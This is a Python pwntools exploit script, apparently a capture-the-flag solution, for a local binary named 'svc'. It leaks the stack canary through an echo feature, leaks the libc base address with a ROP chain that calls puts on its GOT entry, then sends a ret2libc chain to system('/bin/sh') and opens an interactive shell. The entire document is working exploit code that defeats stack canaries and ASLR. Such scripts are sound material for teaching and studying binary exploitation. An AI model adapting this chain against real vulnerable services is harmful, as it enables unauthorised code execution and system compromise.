from pwn import *

context.binary = './svc'
elf = ELF('./svc')
libc = ELF('./libc.so.6')
io = process('./svc')
# io = gdb.debug('./svc', '''
# 	b *0x00400a96
# 	b *0x00400dde
# 	c
# ''')

CANARY_OFFSET = cyclic_find(0x62616172)
RETADDR_OFFSET = cyclic_find(0x62616176)
RET_GADGET_ADDR = 0x00000000004008b1

def leak_canary() -> int:
	log.info('Sending canary leak payload...')
	payload = cyclic(CANARY_OFFSET);
	io.sendline(b'1') # choose to feed scv (fill buffer w/ input)
	io.sendline(payload)
	io.sendline(b'2') # echo back input
	io.recvuntil(payload) # echoes back our input, we don't care

	# next bytes are leaked stack canary
	canary = unpack(b'\x00' + io.recvn(8)[1:], 'all') # \x00 to replace ignored byte with actual one
	log.success(f"Leaked Canary! : 0x{canary:0x}")
	return canary

def leak_libc(canary: int):
	MAIN_ADDR = 0x00400a96

	log.info("Generating ROP payload: Leak Canary...")
	rop = ROP(elf)
	rop.call(elf.symbols[b'puts'], [(elf.got[b'puts'])])
	rop.call(MAIN_ADDR)
	log.info(f"ROP Payload:\n{rop.dump()}")

	payload = flat({
		CANARY_OFFSET  : canary,
		RETADDR_OFFSET : rop.chain(),
	})
	io.sendline(b'1') # fill buffer w/ input
	io.sendline(payload)
	io.sendline(b'3') # return out of main, begin ROP chain
	io.recvuntil(b'[*]BYE ~ TIME TO MINE MIENRALS...')
	puts_leaked = unpack(io.recvn(7)[1:], 'all') # remove weird space
	log.info(f"Leaked puts addr: 0x{puts_leaked:0x}")
	libc.address = puts_leaked - libc.symbols['puts']
	log.success(f"Leaked libc Base Address! : 0x{libc.address:0x}")

def pop_shell(canary: int):
	log.info("Generating ROP payload: system(\"/bin/sh\")...")
	rop = ROP([elf, libc])
	system_addr = libc.symbols['system']
	binsh_addr = next(libc.search(b'/bin/sh'))
	log.info(f'System @ : {system_addr:0x}')
	log.info(f'/bin/sh str @ : {binsh_addr:0x}')
	rop.raw(RET_GADGET_ADDR) # fix stack alignment: ret;
	rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
	log.info(f"ROP Payload:\n{rop.dump()}")

	payload = flat({
		CANARY_OFFSET  : canary,
		RETADDR_OFFSET : rop.chain(),
	})

	io.sendline(b'1') # fill buffer w/ input
	io.sendline(payload)
	io.sendline(b'3') # return out of main, begin ROP chain
	io.recvuntil(b'>>[*]BYE ~ TIME TO MINE MIENRALS...')
	log.success("Got Shell!")
	io.interactive()




canary = leak_canary()
leak_libc(canary)	# modifies libc.address
pop_shell(canary)
